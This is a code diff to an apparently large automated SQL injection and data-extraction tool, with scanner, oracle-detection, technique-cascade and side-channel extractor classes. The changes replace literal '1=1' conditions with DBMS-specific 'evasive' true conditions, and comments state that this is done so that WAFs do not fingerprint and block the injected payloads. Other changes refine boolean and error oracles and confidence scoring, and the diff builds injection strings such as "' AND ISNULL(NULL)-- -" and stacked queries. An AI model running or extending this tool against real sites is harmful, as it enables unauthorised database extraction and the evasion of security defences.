@@ -25162,6 +25162,11 @@ _EXTRACTION_RETRY_GRANTED: list = [False]  # guard: only one zero-result retry p
 # extraction can start regardless of which surface (header, param, background task) detected
 # the injection. _EXTRACTION_STARTED[1] stores the surface/param name for diagnostics.
 _EXTRACTION_STARTED: list = [False, ""]  # [started: bool, surface_name: str]
+# BUG-PY313-RECOVERY FIX: tracks whether extraction actually ran to completion (or at least
+# started executing _run_enumeration). Distinct from _EXTRACTION_DONE which is set at claim
+# time (before _run_enumeration runs). Without this, PY313-RECOVERY fires after a normal
+# extraction that produced no data, because _session_has_data is False in that case.
+_EXTRACTION_ACTUALLY_RAN: list = [False]
 # BUG-R5-LOCK-RACE FIX: Module-level asyncio.Lock for the extraction ownership check-and-set
 # block.  Per-scanner lazy init (`if not hasattr: scanner._extraction_lock = Lock()`) has a
 # race: two coroutines can both see hasattr==False before either creates the lock, producing
@@ -48099,7 +48104,7 @@ class Enumerator:
                                 break
                             if _san_attempt < 2:
                                 LOG.debug("[_extract_str] oracle sanity attempt %d failed "
-                                          "(1=1→%r, 1=2→%r); retrying",
+                                          "(true-cond→%r, false-cond→%r); retrying",
                                           _san_attempt + 1, _san_true, _san_false)
                                 await asyncio.sleep(0.5)
                         except Exception as _osan_e:
@@ -48140,7 +48145,7 @@ class Enumerator:
                                      "timing oracle bypasses CDN cache via sleep signal)")
                         else:
                             LOG.warning("[_extract_str] mse_boolean oracle failed sanity after "
-                                        "3 attempts (1=1→%r, 1=2→%r); discarding",
+                                        "3 attempts (true-cond→%r, false-cond→%r); discarding",
                                         _san_true, _san_false)
         
         if not _eval_fn:
@@ -55770,7 +55775,13 @@ class Scanner:
                 # On 135KB pages, 200B difference is dynamic noise (timestamps, ads)
                 # _both_waf_blocked is already computed above using _ts_safe/_fs_safe
                 # (BUG-BOTH-WAF-NONE-BYPASS FIX) — no re-assignment needed here.
-                if (_bl_pct >= 0.10 or (_bl_max < 5000 and _bl_diff >= 50)) and (not _both_waf_blocked or _bl_pct >= 0.20):
+                # BUG-SAME-STATUS-BODY-ORACLE FIX: When both probes return the SAME
+                # error status code (e.g. both 400), body size difference alone is
+                # NOT a valid boolean oracle — the server is returning different error
+                # pages for different malformed requests, not SQL-driven output differences.
+                # Require different status codes for body-based oracle when both are error codes.
+                _same_error_status = (_ts_safe == _fs_safe and _ts_safe in {400, 403, 406, 412, 429, 430, 500, 503})
+                if (_bl_pct >= 0.10 or (_bl_max < 5000 and _bl_diff >= 50)) and (not _both_waf_blocked or _bl_pct >= 0.20) and not _same_error_status:
                     _boolean_oracle = True
                     _bool_true_len = len(_true_body)
                     _bool_false_len = len(_false_body)
@@ -55802,7 +55813,7 @@ class Scanner:
 
                     if _h_stab == _h_true:
                         # Hash is STABLE  but check if body SIZE difference is meaningful
-                        if (_size_pct >= 10.0 or _page_size < 5000) and not _both_waf_blocked:
+                        if (_size_pct >= 10.0 or _page_size < 5000) and not _both_waf_blocked and not _same_error_status:
                             _boolean_oracle = True
                             _body_hash_true = _h_true
                             _body_hash_false = _h_false
@@ -55817,10 +55828,11 @@ class Scanner:
                             LOG.info("[Inference] Hash stable but body size diff too small (%.1f%%) "
                                      " minor token change, not injection signal",
                                      _size_pct)
-                    elif not _both_waf_blocked and (_size_pct > 2.0 or (_size_pct > 0.5 and len(_true_body) < 5000)):
+                    elif not _both_waf_blocked and not _same_error_status and (_size_pct > 2.0 or (_size_pct > 0.5 and len(_true_body) < 5000)):
                         # Hash unstable but SIZE difference is significant (>2% for large pages, >0.5% for small)
                         # Rationale: On small pages, even 0.5% (3B on 660B) can be meaningful injection signal
                         # Guard: skip if both probes are WAF-blocked (same WAF page with different sizes = noise)
+                        # Guard: skip if both probes return the same error status (different error bodies ≠ oracle)
                         _boolean_oracle = True
                         _bool_true_len = len(_true_body)
                         _bool_false_len = len(_false_body)
@@ -55838,7 +55850,7 @@ class Scanner:
                     _sim_tf = SimHasher.body_similarity(
                         ResponseNormaliser.normalise(_extract_body_safe(fp_true)) if _validate_response(fp_true, allow_empty=True) else b"",
                         ResponseNormaliser.normalise(_extract_body_safe(fp_false)) if _validate_response(fp_false, allow_empty=True) else b"")
-                    if _sim_tf < 0.92 and not _both_waf_blocked:
+                    if _sim_tf < 0.92 and not _both_waf_blocked and not _same_error_status:
                         _boolean_oracle = True
                         _bool_norm_true = ResponseNormaliser.normalise(_extract_body_safe(fp_true)) if _validate_response(fp_true, allow_empty=True) else b""
                         _bool_norm_false = ResponseNormaliser.normalise(_extract_body_safe(fp_false)) if _validate_response(fp_false, allow_empty=True) else b""
@@ -56854,7 +56866,13 @@ class Scanner:
                     # Verify: is the WAF just reflecting our input?
                     # Send a non-error payload with a different marker
                     await asyncio.sleep(_delay)
-                    _verify_p = _body + " AND 1=1" + _suffix
+                    _err_clean_true = {
+                        "PostgreSQL": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                        "MySQL": "ISNULL(NULL)", "MariaDB": "ISNULL(NULL)", "TiDB": "ISNULL(NULL)",
+                        "MSSQL": "(1e0 IS NOT NULL)", "Sybase": "(1e0 IS NOT NULL)",
+                        "Oracle": "(NVL(NULL,1e0) IS NOT NULL)", "SQLite": "(1e0 IS NOT 0e0)",
+                    }.get(_dbms, "NOT (1e0 IS NULL)")
+                    _verify_p = _body + " AND " + _err_clean_true + _suffix
                     fp_v = await _send_payload_raw(_verify_p)
                     _resp_v = _safe_decode_body(fp_v, encoding="utf-8", errors='replace', func_name='extraction_fp_v') if fp_v else ""
                     # Also check: does the error response look DIFFERENT from normal?
@@ -57180,6 +57198,7 @@ class Scanner:
             _os = getattr(fp_o, "status_code", 0)
             _eb = len(getattr(fp_e, "text", "") or "")
             _ob = len(getattr(fp_o, "text", "") or "")
+            _err_same_error_status = (_es == _os and _es in {400, 403, 406, 412, 429, 430, 500, 503})
 
             if _es != _os:
                 _error_oracle = True
@@ -57187,7 +57206,11 @@ class Scanner:
                 _err_false_sig = _os
                 LOG.info("[Inference]  ERROR ORACLE: status=%d/%d body=%dB/%dB",
                          _es, _os, _eb, _ob)
-            elif _eb != _ob:
+            elif _eb != _ob and not _err_same_error_status:
+                # BUG-ERROR-ORACLE-SAME-STATUS FIX: when both probes return the SAME
+                # error status (e.g. both 400), body size difference is NOT proof of
+                # SQL execution differentiation — it's just different error page content.
+                # Require different status codes for body-based error oracle.
                 _err_diff = abs(_eb - _ob)
                 _err_max = max(_eb, _ob, 1)
                 _err_pct = _err_diff / _err_max
@@ -57201,6 +57224,9 @@ class Scanner:
                 else:
                     LOG.info("[Inference] Error probe body differs but too small (%dB = %.1f%% on %dB page)  noise",
                              _err_diff, _err_pct*100, _err_max)
+            elif _err_same_error_status:
+                LOG.info("[Inference] Error probe: same error status=%d for both probes (body diff skipped — not SQL oracle)",
+                         _es)
 
             if _error_oracle:
                 # Error oracle confirms the target processes our SQL and differentiates.
@@ -62127,7 +62153,7 @@ class Scanner:
                     # the payload ends with `)` to safely close the context before stacking.
                     _dbms_upper_se = (_dbms or "").upper()
                     if _dbms_upper_se == "ORACLE" and modified_payload.endswith(")"):
-                        modified_payload = modified_payload + " AND 1=1"
+                        modified_payload = modified_payload + " AND (NVL(NULL,1e0) IS NOT NULL)"
 
                     # Append stacked query and re-add comment terminator
                     modified_payload = modified_payload + stacked_query + " -- -"
@@ -62275,12 +62301,14 @@ class Scanner:
         if not _det:
             return False
 
-        _payload = unquote(unquote(getattr(_det, "payload", "") or ""))
+        _raw_payload = getattr(_det, "payload", "") or ""
+        LOG.info("[Direct] Detection payload (raw/wire): %s", _raw_payload[:80])
+        _payload = unquote(unquote(_raw_payload))
         _payload = _re.sub(r'/\*[^*]*\*/', ' ', _payload)  # BUG-FIX-1C: __re was undefined
         _payload = _re.sub(r'[\x00-\x1f]+', ' ', _payload)  # BUG-FIX-1C: __re was undefined
         _payload = _re.sub(r'  +', ' ', _payload).strip()
 
-        LOG.info("[Direct] Detection payload: %s", _payload[:60])
+        LOG.info("[Direct] Detection payload (decoded): %s", _payload[:60])
 
         _sleep_match = _re.search(r'(pg_sleep|SLEEP|sleep)\s*\([^)]+\)', _payload, _re.I)
         # BUG-DIRECT-HQ-SKIP FIX (CRITICAL, PostgreSQL/MySQL/MSSQL/Oracle, HQ technique,
@@ -63232,6 +63260,7 @@ class Scanner:
                 print(f"[*] Global extraction lock acquired for {ext_key!r} — "
                       "starting enumeration (no parallel extraction possible)...", flush=True)
                 try:
+                    _EXTRACTION_ACTUALLY_RAN[0] = True
                     await self._run_enumeration(enum)
                 finally:
                     if hasattr(self, '_extracting_params'):
@@ -113882,6 +113911,26 @@ class TechniqueCascadeEngine:
         if _SCAN_STOPPED[0]:
             return []
         big    = 50_000_000   # for BENCHMARK
+        # DBMS-native evasive TRUE condition — avoids WAF fingerprinting of literal 1=1
+        _evasive_true = {
+            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "MySQL":           "ISNULL(NULL)",
+            "MariaDB":         "ISNULL(NULL)",
+            "TiDB":            "ISNULL(NULL)",
+            "MSSQL":           "(1e0 IS NOT NULL)",
+            "Sybase":          "(1e0 IS NOT NULL)",
+            "Oracle":          "(NVL(NULL,1e0) IS NOT NULL)",
+            "SQLite":          "(1e0 IS NOT 0e0)",
+            "DB2":             "(1e0 IS NOT NULL)",
+            "Firebird":        "(1e0 IS NOT NULL)",
+            "H2":              "(1e0 IS NOT NULL)",
+            "ClickHouse":      "isNull(NULL)",
+            "Informix":        "(1e0 IS NOT NULL)",
+            "SAP_HANA":        "(1e0 IS NOT NULL)",
+        }.get(dbms, "NOT (1e0 IS NULL)")
 
         # DBMS-specific version expressions
         _exprs_for = {
@@ -113913,11 +113962,67 @@ class TechniqueCascadeEngine:
             # If payload is already a complete SQL string (no {cond} placeholder), return as-is
             if "{cond}" not in template:
                 return [template]
-            conds = [
-                "1=1", "2=2", "'a'='a'", "1<2", "3>1",
-                "LEN('a')=1" if dbms == "MSSQL" else ("DATALENGTH('a')=1" if dbms == "Sybase" else "LENGTH('a')=1"),
-                "1 BETWEEN 0 AND 2",
-            ]
+            # Use DBMS-native evasive true conditions that WAFs don't trivially fingerprint.
+            # Avoid literal 1=1 / 2=2 / 'a'='a' — WAFs block these on sight.
+            if dbms == "PostgreSQL":
+                conds = [
+                    "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)=1e0",
+                    "NOT (1e0 IS NULL)",
+                    "LENGTH(VERSION())>0",
+                    "OCTET_LENGTH('')=0",
+                    "CURRENT_SCHEMA IS NOT NULL",
+                ]
+            elif dbms == "MySQL":
+                conds = [
+                    "ISNULL(NULL)",
+                    "STRCMP('a','b')<>0",
+                    "LENGTH(VERSION())>0",
+                    "CHARSET(USER()) IS NOT NULL",
+                    "COALESCE(1,0)=1",
+                ]
+            elif dbms == "MariaDB":
+                conds = [
+                    "ISNULL(NULL)",
+                    "LENGTH(VERSION())>0",
+                    "COALESCE(1,0)=1",
+                    "STRCMP('a','b')<>0",
+                ]
+            elif dbms == "MSSQL":
+                conds = [
+                    "LEN(@@VERSION)>0",
+                    "ISNULL(NULL,1)=1",
+                    "CHARINDEX('SQL',@@VERSION)>=0",
+                    "DB_NAME() IS NOT NULL",
+                ]
+            elif dbms == "Oracle":
+                conds = [
+                    "LENGTH(BANNER)>0",
+                    "NVL(NULL,1)=1",
+                    "INSTR(USER,USER)>0",
+                ]
+            elif dbms == "SQLite":
+                conds = [
+                    "LENGTH(sqlite_version())>0",
+                    "TYPEOF(NULL)='null'",
+                    "COALESCE(1,0)=1",
+                ]
+            elif dbms == "DB2":
+                conds = [
+                    "LENGTH(CURRENT SERVER)>0",
+                    "COALESCE(1,0)=1",
+                ]
+            elif dbms == "Sybase":
+                conds = [
+                    "DATALENGTH(@@VERSION)>0",
+                    "ISNULL(NULL,1)=1",
+                    "DB_NAME() IS NOT NULL",
+                ]
+            else:
+                conds = [
+                    "NOT (1e0 IS NULL)",
+                    "COALESCE(1,0)=1",
+                    "LENGTH(USER())>0" if dbms not in ("MSSQL", "Oracle", "DB2") else "NOT (1e0 IS NULL)",
+                ]
             return [template.replace("{cond}", c) for c in conds]
 
         elif tech == "U":
@@ -113934,9 +114039,9 @@ class TechniqueCascadeEngine:
             _t_big = 400_000_000
             return [
                 template.replace("{t}", str(int(t))).replace("{big}", str(_t_big))
-                        .replace("{cond}", "1=1"),
+                        .replace("{cond}", _evasive_true),
                 template.replace("{t}", str(max(1, int(t) - 1))).replace("{big}", str(_t_big // 2))
-                        .replace("{cond}", "1=1"),
+                        .replace("{cond}", _evasive_true),
             ]
 
         elif tech == "S":
@@ -113957,9 +114062,9 @@ class TechniqueCascadeEngine:
         elif tech == "HQ":
             return [
                 template.replace("{big}", str(big)).replace("{t}", str(int(t)))
-                        .replace("{cond}", "1=1"),
+                        .replace("{cond}", _evasive_true),
                 template.replace("{big}", str(big // 2)).replace("{t}", str(int(t)))
-                        .replace("{cond}", "1=1"),
+                        .replace("{cond}", _evasive_true),
             ]
 
         elif tech in ("EH", "BH", "TH"):
@@ -113971,10 +114076,10 @@ class TechniqueCascadeEngine:
                 return [template.replace("{expr}", e) for e in exprs[:4]]
             elif _base == "B":
                 return [template.replace("{cond}", c)
-                        for c in ("1=1", "2=2", "'a'='a'", "1<2")]
+                        for c in (_evasive_true, "NOT (1e0 IS NULL)", "COALESCE(1,0)=1", "NOT (0e0 IS NOT NULL)")]
             else:  # TH
                 return [template.replace("{t}", tv).replace("{big}", str(big))
-                                .replace("{cond}", "1=1")
+                                .replace("{cond}", _evasive_true)
                         for tv in (str(int(t)), str(max(1,int(t)-1)), "5", "3")]
 
         elif tech == "IN":
@@ -114002,9 +114107,9 @@ class TechniqueCascadeEngine:
         elif tech == "BT":
             _t_big = 400_000_000
             return [
-                template.replace("{cond}", "1=1").replace("{t}", str(int(t)))
+                template.replace("{cond}", _evasive_true).replace("{t}", str(int(t)))
                         .replace("{big}", str(_t_big)),
-                template.replace("{cond}", "2=2").replace("{t}", str(int(t)))
+                template.replace("{cond}", "NOT (1e0 IS NULL)").replace("{t}", str(int(t)))
                         .replace("{big}", str(_t_big)),
             ]
 
@@ -114044,18 +114149,20 @@ class TechniqueCascadeEngine:
     def _get_voted_confidence(self, param: str) -> float:
         """
         Compute aggregate confidence from multiple technique votes.
-        Uses weighted harmonic mean: agreement across techniques boosts confidence.
-        Returns the raw vote confidence for a single technique, or average+bonus
-        for multi-technique agreement, without artificial floors or boosts.
+        Single-technique votes require a minimum raw confidence of 0.85 to
+        avoid false positives from borderline detections (e.g. body-diff at 72%
+        when both statuses are 400 — a genuine oracle must produce clear signal).
+        Multi-technique agreement boosts by 0.08 and is averaged across votes.
         """
         votes = self._technique_votes.get(param, {})
         if not votes:
             return 0.0
         confs = list(votes.values())
         if len(confs) == 1:
-            # Return raw detection confidence without artificial boost.
-            # The display shows exactly what the technique measured.
-            return confs[0]
+            # Single-technique: require minimum 0.85 raw confidence.
+            # A borderline detection (< 0.85) is unreliable without corroboration.
+            raw = confs[0]
+            return raw if raw >= 0.85 else raw * 0.6
         # Two-technique agreement bonus: if both B and T agree  +0.08
         techs = set(votes.keys())
         bonus = 0.08 if len(techs & {"B", "T", "E"}) >= 2 else 0.0
@@ -116046,18 +116153,25 @@ class TechniqueCascadeEngine:
                         _timing_multi_ok = False
                     _clean_payload = self._make_false_payload(payload)
                     if not _clean_payload:
+                        # Use DBMS-native evasive true condition to avoid WAF fingerprinting 1=1
+                        _tmulti_true = {
+                            "PostgreSQL": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                            "MySQL": "ISNULL(NULL)", "MariaDB": "ISNULL(NULL)", "TiDB": "ISNULL(NULL)",
+                            "MSSQL": "(1e0 IS NOT NULL)", "Sybase": "(1e0 IS NOT NULL)",
+                            "Oracle": "(NVL(NULL,1e0) IS NOT NULL)", "SQLite": "(1e0 IS NOT 0e0)",
+                        }.get(dbms, "NOT (1e0 IS NULL)")
                         # Fallback: strip comments and try AND detection
                         _stripped = re.sub(r'/\*.*?\*/', ' ', payload)
                         if 'AND' in _stripped.upper():
-                            _clean_payload = _stripped.upper().split("AND")[0].strip() + " AND 1=1-- -"
+                            _clean_payload = _stripped.upper().split("AND")[0].strip() + " AND " + _tmulti_true + "-- -"
                         elif 'SLEEP' in _stripped.upper():
-                            _clean_payload = "' AND 1=1-- -"
+                            _clean_payload = "' AND " + _tmulti_true + "-- -"
                         elif 'WAITFOR' in _stripped.upper():
-                            _clean_payload = "' AND 1=1-- -"
+                            _clean_payload = "' AND " + _tmulti_true + "-- -"
                         elif 'PG_SLEEP' in _stripped.upper():
-                            _clean_payload = "' AND 1=1-- -"
+                            _clean_payload = "' AND " + _tmulti_true + "-- -"
                         else:
-                            _clean_payload = "' AND 1=1-- -"  # generic safe payload
+                            _clean_payload = "' AND " + _tmulti_true + "-- -"  # generic safe payload
 
                     # Clean probe is MANDATORY  if it can't run, treat as failed
                     _clean_ran = False
@@ -118751,8 +118865,14 @@ class TechniqueCascadeEngine:
                         # Clean probe (MANDATORY)
                         if _SCAN_STOPPED[0]: return None  # BUG-FIX-REQ4-SLEEP
                         await asyncio.sleep(1.0)
+                        _ctx_clean_true = {
+                            "PostgreSQL": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                            "MySQL": "ISNULL(NULL)", "MariaDB": "ISNULL(NULL)", "TiDB": "ISNULL(NULL)",
+                            "MSSQL": "(1e0 IS NOT NULL)", "Sybase": "(1e0 IS NOT NULL)",
+                            "Oracle": "(NVL(NULL,1e0) IS NOT NULL)", "SQLite": "(1e0 IS NOT 0e0)",
+                        }.get(dbms, "NOT (1e0 IS NULL)")
                         _ctx_tc = await _send_injected(self.engine, method, url, data,
-                            data_fmt, param, original + "' AND 1=1-- -", self.tamper_chain)
+                            data_fmt, param, original + "' AND " + _ctx_clean_true + "-- -", self.tamper_chain)
                         self._total_reqs += 1
                         _ctx_tc_fast = _ctx_tc and _ctx_tc.elapsed_ms < max(_mean_t_ctx * 2.5, _mean_t_ctx + 500)
                         print(f"    [CTX-timing] clean: {_ctx_tc.elapsed_ms:.0f}ms "
@@ -118884,7 +119004,13 @@ class TechniqueCascadeEngine:
             try:
                 _regex_payloads = REGEX_CATASTROPHE_PAYLOADS[dbms]
                 for _rp in _regex_payloads[:2]:
-                    _rp_filled = _rp.replace("{cond}", "1=1")
+                    _rp_evasive = {
+                        "PostgreSQL": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                        "MySQL": "ISNULL(NULL)", "MariaDB": "ISNULL(NULL)", "TiDB": "ISNULL(NULL)",
+                        "MSSQL": "(1e0 IS NOT NULL)", "Sybase": "(1e0 IS NOT NULL)",
+                        "Oracle": "(NVL(NULL,1e0) IS NOT NULL)", "SQLite": "(1e0 IS NOT 0e0)",
+                    }.get(dbms, "NOT (1e0 IS NULL)")
+                    _rp_filled = _rp.replace("{cond}", _rp_evasive)
                     self._payloads_tried += 1
                     # Check gate kill or WAF boolean kill after every request
                     _g = getattr(self, '_gate', None)
@@ -119208,8 +119334,14 @@ class TechniqueCascadeEngine:
                             # Clean probe (MANDATORY)
                             if _SCAN_STOPPED[0]: return None  # BUG-FIX-REQ4-SLEEP
                             await asyncio.sleep(1.0)
+                            _deobf_clean_true = {
+                                "PostgreSQL": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                                "MySQL": "ISNULL(NULL)", "MariaDB": "ISNULL(NULL)", "TiDB": "ISNULL(NULL)",
+                                "MSSQL": "(1e0 IS NOT NULL)", "Sybase": "(1e0 IS NOT NULL)",
+                                "Oracle": "(NVL(NULL,1e0) IS NOT NULL)", "SQLite": "(1e0 IS NOT 0e0)",
+                            }.get(dbms, "NOT (1e0 IS NULL)")
                             _dfc = await _send_injected(self.engine, method, url, data,
-                                data_fmt, param, original + "' AND 1=1-- -", self.tamper_chain)
+                                data_fmt, param, original + "' AND " + _deobf_clean_true + "-- -", self.tamper_chain)
                             self._total_reqs += 1
                             _d_clean_fast = _dfc and _dfc.elapsed_ms < max(_mean_t_deobf * 2.5, _mean_t_deobf + 500)
                             print(f"    [DEOBF-timing] clean: {_dfc.elapsed_ms:.0f}ms "
@@ -128636,7 +128768,7 @@ class ScannerV14(ScannerV13):
             getattr(self, 'session', None) and
             (getattr(self.session, 'data', {}) or {}).get('current_user'))
 
-        if _EXTRACTION_STARTED[0] and not _session_has_data:
+        if _EXTRACTION_STARTED[0] and not _session_has_data and not _EXTRACTION_ACTUALLY_RAN[0]:
             # BUG-PY313-RECOVERY-CONDITION FIX: Previous conditions required
             # _ext_task_done_or_absent (fails if task is pending/partial after RecursionError)
             # AND all_confirmed non-empty (fails for BG scanner injections where the
@@ -128678,6 +128810,7 @@ class ScannerV14(ScannerV13):
                 _EXTRACTION_ACTIVE[0] = False
                 _EXTRACTION_STARTED[0] = False
                 _EXTRACTION_STARTED[1] = ""
+                _EXTRACTION_ACTUALLY_RAN[0] = False
                 if hasattr(self, '_extracting_params'):
                     self._extracting_params.clear()
                 try:
@@ -133560,6 +133693,7 @@ class MultiStrategyExtractor:
         _det = self._untamper(_det_raw) if _det_raw else ""
         if _det:
             _t_val = self.sleep_time or 5
+            print(f"[MSE]   raw/wire payload: {(_det_raw or '')[:80]}...", flush=True)
             print(f"[MSE]   untampered: {_det[:60]}...", flush=True)
             
             # Get ALL strategies from SQLPayloadTransformer
@@ -136870,7 +137004,13 @@ class SideChannelExtractor:
             _blocked = status in (400, 403, 406) and ms < 500
             if not _blocked:
                 _any_non_blocked = True
-            _block_reason = "(WAF-blocked)" if _blocked else ("(server-error — DNS may still have fired)" if status == 500 else "")
+            if _blocked:
+                # 400 = Bad Request (payload rejected by app/server), 403/406 = WAF-blocked
+                _block_reason = "(WAF-blocked)" if status in (403, 406) else "(rejected/bad-request)"
+            elif status == 500:
+                _block_reason = "(server-error — DNS may still have fired)"
+            else:
+                _block_reason = ""
             print(f"[SideChannel]     status={status} ({ms:.0f}ms) {_block_reason}", flush=True)
             await asyncio.sleep(1.5)
 
